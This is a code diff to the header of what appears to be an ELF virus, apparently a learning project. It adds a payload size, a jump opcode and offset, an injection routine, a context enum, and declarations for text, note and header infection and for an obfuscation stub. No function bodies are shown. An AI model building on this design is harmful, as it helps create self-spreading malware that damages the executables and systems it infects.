@@ -14,6 +14,7 @@
 #include <sys/mman.h>
 #include <unistd.h>
 #include <stdbool.h>
+#include <string.h>
 
 ////////////////////////////////////////////////////////////////////////////////
 /// MACROS 
@@ -26,11 +27,21 @@
 #define LEFT 0
 #define RIGHT 1
 
-#define PAYLOAD_SIZE (size_t)((void *)__exit - (void *)__entry)
+//#define PAYLOAD_SIZE (size_t)((void *)__exit - (void *)__entry)
+#define PAYLOAD_SIZE 36
+
+#define JMP_OFFSET 66
+#define JMP_OPCODE 0xe9
 
 ////////////////////////////////////////////////////////////////////////////////
 /// ENUMS
 ////////////////////////////////////////////////////////////////////////////////
+
+enum e_context
+{
+	SUCCESS,
+	FAILURE,
+};
 
 ////////////////////////////////////////////////////////////////////////////////
 /// STRUCTURES
@@ -74,12 +85,13 @@ struct s_keychain
 
 // LINEAR FLOW 
 void __entry(void);
-void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename);
-void criteria(struct s_host *host, struct s_keychain *keychain);
-void text_infection(struct s_host *host, struct s_keychain *keychain);
-void note_infection(struct s_host *host, struct s_keychain *keychain);
-void header_infection(struct s_host *host, struct s_keychain *keychain);
-void __exit(void);
+void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename, enum e_context context);
+void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context contect);
+void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
+void __exit(struct s_host *host, struct s_keychain *keychain, const enum e_context context);
 
 // STUB (OBFUSCATION)
 __attribute__((hot)) void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size);
